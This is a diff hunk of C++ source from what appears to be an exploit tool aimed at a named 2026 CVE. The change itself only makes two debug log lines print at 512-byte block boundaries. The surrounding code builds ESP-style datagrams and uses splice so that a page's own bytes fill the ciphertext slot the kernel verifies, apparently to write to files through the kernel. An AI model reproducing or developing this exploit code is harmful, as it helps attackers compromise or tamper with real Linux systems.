@@ -171,13 +171,19 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             store_be32(datagram.data(), spi_);
             store_be32(datagram.data() + 4U, next_seq_);
             /* 写侧事实：位置、门的 fd（远端为 -1）、套接字、以及本面能否供页（远端=经桥）。 */
-            GL_LOGI("write_block enter pos=%llu fd=%d sock=%d serve=%d",
-                    static_cast<unsigned long long>(position), doors_.file_fd(), doors_.socket_fd(),
-                    splice_.can_serve_page() ? 1 : 0);
-            GL_LOGI("window: send seq=%u offset=%llu hdr=%02x%02x%02x%02x%02x%02x%02x%02x", next_seq_,
-                        static_cast<unsigned long long>(position),
-                        datagram[0], datagram[1], datagram[2], datagram[3],
-                        datagram[4], datagram[5], datagram[6], datagram[7]);
+            /*
+             * 粒度对齐参照实现（ghostlock-app-ref@5f184760，每 512 字节一行）：只在块边界打印。
+             * 发送失败/序号未递增等异常行在下方逐块保留，定位不受影响。
+             */
+            if ((position % 512ULL) == 0ULL) {
+                GL_LOGI("write_block enter pos=%llu fd=%d sock=%d serve=%d",
+                        static_cast<unsigned long long>(position), doors_.file_fd(), doors_.socket_fd(),
+                        splice_.can_serve_page() ? 1 : 0);
+                GL_LOGI("window: send seq=%u offset=%llu hdr=%02x%02x%02x%02x%02x%02x%02x%02x", next_seq_,
+                            static_cast<unsigned long long>(position),
+                            datagram[0], datagram[1], datagram[2], datagram[3],
+                            datagram[4], datagram[5], datagram[6], datagram[7]);
+            }
             /* The check covers what the wire will carry, and the wire carries the page's own bytes in
              * the ciphertext slot -- splice_one substitutes them there. Putting the desired block in
              * this slot instead would authenticate bytes nobody sends, and the kernel, which verifies
